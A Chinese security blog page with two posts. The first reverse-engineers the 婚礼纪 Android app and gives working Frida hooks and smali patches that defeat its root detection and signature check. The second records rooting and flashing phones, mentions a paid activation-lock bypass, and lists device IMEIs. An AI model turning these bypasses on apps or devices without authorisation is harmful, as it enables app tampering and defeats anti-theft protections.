<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Tig3rHu&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Tig3rHu&#39;s Blog">
<meta property="og:url" content="https://tig3rhu.github.io/index.html">
<meta property="og:site_name" content="Tig3rHu&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Tig3rHu">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Tig3rHu's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Tig3rHu&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tig3rhu.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-67__逆向__婚礼纪APP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/" class="article-date">
  <time class="dt-published" datetime="2024-01-03T15:51:59.971Z" itemprop="datePublished">2024-01-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/">apk逆向__婚礼纪逆向</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>婚礼纪在root环境中，会检测root，闪退，并且还有签名校验。</p>
<p>提示信息 ：当前运行环境有风险，请在安全的环境运行“婚礼纪“应用</p>
<p>婚礼纪app 版本： 9.5.3</p>
<p>查壳：</p>
<p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102232516234.png"></p>
<h2 id="定位闪退点"><a href="#定位闪退点" class="headerlink" title="定位闪退点"></a>定位闪退点</h2><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>文本搜索，并没搜索到，不知道咋回事。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102233418031.png"></p>
<h3 id="算法助手拦截"><a href="#算法助手拦截" class="headerlink" title="算法助手拦截"></a>算法助手拦截</h3><p>拦截方法：</p>
<ul>
<li>LSPPosed 应用启用算法助手模块 应用于 婚礼纪app</li>
<li>算法助手 应用 点击 log捕获，监听，防止闪退等记录。</li>
</ul>
<p>确定app 应用结束进程的堆栈在 “me.suncloud.marrymemo.view.SplashActivity.onCreate “ 内。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102234243709.png"></p>
<h2 id="jadx-分析"><a href="#jadx-分析" class="headerlink" title="jadx 分析"></a>jadx 分析</h2><h3 id="定位root检测点"><a href="#定位root检测点" class="headerlink" title="定位root检测点"></a>定位root检测点</h3><p>直接找到 me.suncloud.marrymemo.view.SplashActivity.onCreate 函数。</p>
<p>根据代码，可以看到在 line 93 有一个判断 ZGRootChecker.isDeviceRooted() 来检测当前root 环境。另外在 line 88 还会检测app 签名，如果后期修改smail 代码，可以绕过这些判断校验。如果不通这些校验，就会调用 finish() 函数终止进程。</p>
<p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240102233919727.png"></p>
<h3 id="root检测代码"><a href="#root检测代码" class="headerlink" title="root检测代码"></a>root检测代码</h3><p>根据上面的分析， ZGRootChecker.isDeviceRooted() 这个函数会检测当前设备root 权限，检测代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">/* loaded from: classes16.dex */</span><br><span class="line">public class ZGRootChecker &#123;</span><br><span class="line">    public static boolean isDeviceRooted() &#123;</span><br><span class="line">        return checkRootMethod1() || checkRootMethod2() || checkRootMethod3();</span><br><span class="line">    &#125;</span><br><span class="line">    private static boolean checkRootMethod1() &#123;</span><br><span class="line">        String str = Build.TAGS;</span><br><span class="line">        return str != null &amp;&amp; str.contains(&quot;test-keys&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    private static boolean checkRootMethod2() &#123;</span><br><span class="line">        String[] strArr = &#123;&quot;/system/app/Superuser.apk&quot;, &quot;/sbin/su&quot;, &quot;/system/bin/su&quot;, &quot;/system/xbin/su&quot;, &quot;/data/local/xbin/su&quot;, &quot;/data/local/bin/su&quot;, &quot;/system/sd/xbin/su&quot;, &quot;/system/bin/failsafe/su&quot;, &quot;/data/local/su&quot;, &quot;/su/bin/su&quot;&#125;;</span><br><span class="line">        for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">            if (new File(strArr[i]).exists()) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    private static boolean checkRootMethod3() &#123;</span><br><span class="line">        boolean z = false;</span><br><span class="line">        Process process = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(new String[]&#123;&quot;/system/xbin/which&quot;, &quot;su&quot;&#125;);</span><br><span class="line">            if (new BufferedReader(new InputStreamReader(process.getInputStream())).readLine() != null) &#123;</span><br><span class="line">                z = true;</span><br><span class="line">            &#125;</span><br><span class="line">            process.destroy();</span><br><span class="line">            return z;</span><br><span class="line">        &#125; catch (Throwable unused) &#123;</span><br><span class="line">            if (process != null) &#123;</span><br><span class="line">                process.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h3><p>ZGSafetyMonitor.checkSHA1(this, getString(R.string.certificate_sha1)) 判断，代码很简单，计算SHA 的值，然后进行匹配。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* loaded from: classes16.dex */</span><br><span class="line">public class ZGSafetyMonitor &#123;</span><br><span class="line">    public static boolean checkSHA1(Context context, String sha1) &#123;</span><br><span class="line">        return new ZGSignatureChecker(context, sha1).checkSHA1();</span><br><span class="line">    &#125;</span><br><span class="line">    public static boolean checkMD5(Context context, String md5) &#123;</span><br><span class="line">        return new ZGSignatureChecker(context, md5).checkMD5();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ZGSignatureChecker</span><br><span class="line"></span><br><span class="line">    public boolean checkSHA1() &#123;</span><br><span class="line">        if (this.realCer != null) &#123;</span><br><span class="line">            this.cer = CommonUtil.getMD5(getCertificateSHA1Fingerprint().trim());</span><br><span class="line">            String trim = this.realCer.trim(); </span><br><span class="line">            this.realCer = trim; </span><br><span class="line">            return this.cer.equals(trim);  </span><br><span class="line">        &#125; </span><br><span class="line">        return false;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public boolean checkMD5() &#123;  </span><br><span class="line">        if (this.realCer != null) &#123;  </span><br><span class="line">            this.cer = CommonUtil.getMD5(getCertificateMD5Fingerprint().trim());  </span><br><span class="line">            String trim = this.realCer.trim();  </span><br><span class="line">            this.realCer = trim;  </span><br><span class="line">            return this.cer.equals(trim);  </span><br><span class="line">        &#125;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="绕过root检测"><a href="#绕过root检测" class="headerlink" title="绕过root检测"></a>绕过root检测</h2><h3 id="frida-hook"><a href="#frida-hook" class="headerlink" title="frida hook"></a>frida hook</h3><p>从jadx内转出frida脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let ZGRootChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGRootChecker&quot;);</span><br><span class="line">ZGRootChecker[&quot;isDeviceRooted&quot;].implementation = function () &#123;</span><br><span class="line">    console.log(&#x27;isDeviceRooted is called&#x27;);</span><br><span class="line">    let ret = this.isDeviceRooted();</span><br><span class="line">    console.log(&#x27;isDeviceRooted ret value is &#x27; + ret);</span><br><span class="line">    return ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>获取app 进程号，我发现dumpsys 获取不到，可以通过ps 查看进程pid<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103225513890.png"></p>
<p>Frida Hook 脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Author       : TigerHu</span><br><span class="line">Version      : V1.0</span><br><span class="line">Date         : 2024-01-03 22:30:03</span><br><span class="line">Description  : </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def adb_forward():</span><br><span class="line">    os.system(&#x27;adb forward tcp:27042 tcp:27042&#x27;)</span><br><span class="line">    os.system(&#x27;adb forward tcp:27043 tcp:27043&#x27;)</span><br><span class="line"></span><br><span class="line">jscode = &quot;&quot;&quot;</span><br><span class="line">    Java.perform(function()&#123; </span><br><span class="line">        let ZGRootChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGRootChecker&quot;);</span><br><span class="line">        ZGRootChecker[&quot;isDeviceRooted&quot;].implementation = function () &#123;</span><br><span class="line">            console.log(&#x27;isDeviceRooted is called&#x27;);</span><br><span class="line">            let ret = this.isDeviceRooted();</span><br><span class="line">            console.log(&#x27;isDeviceRooted ret value is &#x27; + ret);</span><br><span class="line">            return False;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(&quot;[*]  &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line">adb_forward()</span><br><span class="line"># 查找远程设备并附加到目标进程</span><br><span class="line"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="line"># frida.get_usb_device  获取usb 设备</span><br><span class="line">process = frida.get_usb_device().attach(3470)</span><br><span class="line">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="line">#session = device.attach(pid)</span><br><span class="line">#device.resume(pid)</span><br><span class="line"># 在目标进程里创建脚本</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line"># 注册消息回调</span><br><span class="line">script.on(&quot;message&quot;, on_message)</span><br><span class="line">print(&#x27;[*] Hook Start Running&#x27;)</span><br><span class="line"># 加载创建好的javascript 脚本</span><br><span class="line">script.load()</span><br><span class="line"># 读取系统输入</span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试通过</p>
<p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103225336215.png"></p>
<p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103225633863.jpeg"></p>
<h2 id="绕过签名校验"><a href="#绕过签名校验" class="headerlink" title="绕过签名校验"></a>绕过签名校验</h2><p>测试一下app的签名校验是否有效，使用MT管理器重新签名安装，可以看到会弹出提示词，提示词内容和前面分析的是一致的。</p>
<p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103230037131.png"></p>
<p>直接上frida hook 一下。</p>
<p>hook 这一块无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let ZGSafetyMonitor = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGSafetyMonitor&quot;);</span><br><span class="line">ZGSafetyMonitor[&quot;checkSHA1&quot;].implementation = function (context, sha1) &#123;</span><br><span class="line">    console.log(&#x27;checkSHA1 is called&#x27; + &#x27;, &#x27; + &#x27;context: &#x27; + context + &#x27;, &#x27; + &#x27;sha1: &#x27; + sha1);</span><br><span class="line">    let ret = this.checkSHA1(context, sha1);</span><br><span class="line">    console.log(&#x27;checkSHA1 ret value is &#x27; + ret);</span><br><span class="line">    return ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最终hook 了这个函数<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103231357323.png"></p>
<h3 id="frida-hook-1"><a href="#frida-hook-1" class="headerlink" title="frida hook"></a>frida hook</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Author       : TigerHu</span><br><span class="line">Version      : V1.0</span><br><span class="line">Date         : 2024-01-03 22:30:03</span><br><span class="line">Description  : </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def adb_forward():</span><br><span class="line">    os.system(&#x27;adb forward tcp:27042 tcp:27042&#x27;)</span><br><span class="line">    os.system(&#x27;adb forward tcp:27043 tcp:27043&#x27;)</span><br><span class="line"></span><br><span class="line">jscode = &quot;&quot;&quot;</span><br><span class="line">	// 这一部分是绕过签名校验</span><br><span class="line">    Java.perform(function()&#123; </span><br><span class="line">        let ZGSignatureChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGSignatureChecker&quot;);</span><br><span class="line">        ZGSignatureChecker[&quot;checkSHA1&quot;].implementation = function () &#123;</span><br><span class="line">            console.log(&#x27;checkSHA1 is called&#x27;);</span><br><span class="line">            let ret = this.checkSHA1();</span><br><span class="line">            console.log(&#x27;checkSHA1 ret value is &#x27; + ret);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">    // 这一部分是绕过root检测</span><br><span class="line">    Java.perform(function()&#123; </span><br><span class="line">    let ZGRootChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGRootChecker&quot;);</span><br><span class="line">    ZGRootChecker[&quot;isDeviceRooted&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(&#x27;isDeviceRooted is called&#x27;);</span><br><span class="line">        let ret = this.isDeviceRooted();</span><br><span class="line">        console.log(&#x27;isDeviceRooted ret value is &#x27; + ret);</span><br><span class="line">        return False;</span><br><span class="line">    &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(&quot;[*]  &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line">adb_forward()</span><br><span class="line"># 查找远程设备并附加到目标进程</span><br><span class="line"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="line"># frida.get_usb_device  获取usb 设备</span><br><span class="line">process = frida.get_usb_device().attach(16572)</span><br><span class="line">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="line">#session = device.attach(pid)</span><br><span class="line">#device.resume(pid)</span><br><span class="line"># 在目标进程里创建脚本</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line"># 注册消息回调</span><br><span class="line">script.on(&quot;message&quot;, on_message)</span><br><span class="line">print(&#x27;[*] Hook Start Running&#x27;)</span><br><span class="line"># 加载创建好的javascript 脚本</span><br><span class="line">script.load()</span><br><span class="line"># 读取系统输入</span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="修改Smali绕过检测"><a href="#修改Smali绕过检测" class="headerlink" title="修改Smali绕过检测"></a>修改Smali绕过检测</h2><h3 id="绕过签名校验-1"><a href="#绕过签名校验-1" class="headerlink" title="绕过签名校验"></a>绕过签名校验</h3><p>这里要让 checkSHA1() 返回true 。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103234954167.png"></p>
<h3 id="绕过root-检测"><a href="#绕过root-检测" class="headerlink" title="绕过root 检测"></a>绕过root 检测</h3><p>这里记住是改为 0 ，因为要让isDeviceRooted函数返回false。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103234652758.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/" data-id="clqxyl5li0000egvb37h54993" data-title="apk逆向__婚礼纪逆向" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-13__Android各种机型刷机记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2024-01-02T15:08:52.987Z" itemprop="datePublished">2024-01-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/">Android各种机型刷机踩坑记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>手机刷机前要知道的一些基础知识<br><a target="_blank" rel="noopener" href="https://xqrp.com/657891.html">https://xqrp.com/657891.html</a></p>
<p>线刷：利用数据线将手机与电脑连接，刷入刷机包recovery 等固件的方式。</p>
<p> 卡刷： 用电脑在手机fastboot 模式下刷入第三方rec， 也就是大家常说的twrp。刷入完成，用rec 方式进入twrp，进入电脑下载好卡刷包，然后复制移动进去内置存储，选中卡刷包，等待刷入完成即可。</p>
<p>这里有一个小技巧，如果实在自己官方系统不开机，你可以尝试一下刷第三方的rom 将就用。</p>
<p>ozip: ozip 是 oppo 的加密格式，无法直接解压修改，必须转换成zip才可以编辑，可以用ozip 转换zip 的工具来实现。</p>
<h1 id="oppo-Find-X-解锁ROOT"><a href="#oppo-Find-X-解锁ROOT" class="headerlink" title="oppo Find X 解锁ROOT"></a>oppo Find X 解锁ROOT</h1><p><strong>安装深度测试app</strong></p>
<p>手机开启USB 调试，然后使用adb 安装 apk </p>
<p><strong>手机系统版本：</strong></p>
<ul>
<li>ColorOs V11</li>
<li>Android 11</li>
<li>Find X 全网通版 （PAFM00）</li>
<li>IMEI 1 : 862716047717796</li>
<li>IMEI 2:  862716047717788</li>
<li>版本号： PAFM00_11_H.15</li>
<li>基带版本： Q_V1_P14,Q_V1_P14</li>
</ul>
<h2 id="手机解锁BL-申请"><a href="#手机解锁BL-申请" class="headerlink" title="手机解锁BL 申请"></a>手机解锁BL 申请</h2><p>手机下载OPPO 社区</p>
<p><a target="_blank" rel="noopener" href="https://www.oppo.cn/thread-397164526-1">https://www.oppo.cn/thread-397164526-1</a></p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20220926153606844.png"></p>
<h2 id="手机刷机降级"><a href="#手机刷机降级" class="headerlink" title="手机刷机降级"></a>手机刷机降级</h2><p>刷机图文详解教程： </p>
<p>下载卡刷包OTA固件ROM，通过官方的刷机教程，显示安装版本低于当前使用版本</p>
<p>现在的版本是最早的版本。</p>
<p>最低的话是只能降出厂版本。</p>
<h3 id="刷root-步骤"><a href="#刷root-步骤" class="headerlink" title="刷root 步骤"></a>刷root 步骤</h3><p><strong>刷机前提</strong></p>
<p>手机USB 连接到笔记本，保证adb 可以进入到手机的shell 中。</p>
<p>手机通过深度测试。</p>
<p><strong>首先进入fastboot 模式</strong></p>
<p>我们可以看到Device STATE: locked, 此时说明手机的bootloader 处于锁定的状态。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221104104525701.png" alt="image-20221104104525701"></p>
<p>输入以下的命令，对 bootloader 进行解锁。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221104105227827.png" alt="image-20221104105227827"></p>
<p>手机的页面会从上面的页面弹到下面的页面，这个页面是询问是否能解锁，确认解锁就使用音量键选择 UNLOCK THE BOOTLOADER </p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221104105157753.png" alt="image-20221104105157753"></p>
<h3 id="申诉激活"><a href="#申诉激活" class="headerlink" title="申诉激活"></a>申诉激活</h3><p>【欢太科技】尊敬的用户，您好！当前需要您提交帐号申诉解决问题，为了提高申诉通过率，请点击：<a target="_blank" rel="noopener" href="https://opdwz.cn/6Nz2E3h">https://opdwz.cn/6Nz2E3h</a> 查看申诉填写的图文操作指引。看完指导后再点击：<a target="_blank" rel="noopener" href="https://safe.heytap.com/">https://safe.heytap.com</a>  开始填写申诉。<br>温馨提醒： 1.申诉结果会在1-2个工作日内尽快发送给您； 2.申诉进度可点击：<a target="_blank" rel="noopener" href="https://opdwz.cn/ZF7zUvu">https://opdwz.cn/ZF7zUvu</a> 查询。3.帐号脱绑请点击申诉首页的“忘记帐号”进行申诉。 如有疑问，请点击<a target="_blank" rel="noopener" href="https://opdwz.cn/jARRBzl">https://opdwz.cn/jARRBzl</a> 寻求在线客服帮助，祝您生活愉快！</p>
<p>参考moto 手机里的视频 ，最后一步 是打开查找功能</p>
<p>这里遇到了两个问题<br>问题1： 由于设备时二手手机，所以买了刷机的时候，有激活锁，因为是二手手机，所以并不知道原始的激活码。</p>
<p>解决：在淘宝花了30块钱，远程通过盲人模式绕过了激活锁，后面有时间把绕过激活锁这个流程发布出来。</p>
<p>问题2： 由于oppo 并没有发布官方的rom，不小心刷了第三方的社区的rom，手机成砖了。、</p>
<p>解决： 跟oppo的客服打电话求助，说这一块要带着发票和购买凭证去刷机，然后在软磨硬泡下，最终同意我拿到线下维修点，帮我刷机。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>OPPO Find X 解锁 BootLoader &amp; root </p>
<p><a target="_blank" rel="noopener" href="https://wuxianlin.com/2018/09/22/oppo-findx-root/">https://wuxianlin.com/2018/09/22/oppo-findx-root/</a></p>
<p>小米只能进fastboot 和rec 救砖</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49941977/article/details/126836851">https://blog.csdn.net/weixin_49941977/article/details/126836851</a></p>
<h1 id="moto-手机ROOT"><a href="#moto-手机ROOT" class="headerlink" title="moto 手机ROOT"></a>moto 手机ROOT</h1><h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><a target="_blank" rel="noopener" href="https://motorola-global-portal.custhelp.com/app/standalone/bootloader/unlock-your-device-b">https://motorola-global-portal.custhelp.com/app/standalone/bootloader/unlock-your-device-b</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv18455372">https://www.bilibili.com/read/cv18455372</a></p>
<p>先注册账号，然后下载sdk tools ,主要是安装 adb  和fastboot工具</p>
<p>然后把oem解锁打开，这样才能解锁bl。</p>
<p>关机，同时按住音量键和电源键。进入到fastboot模式</p>
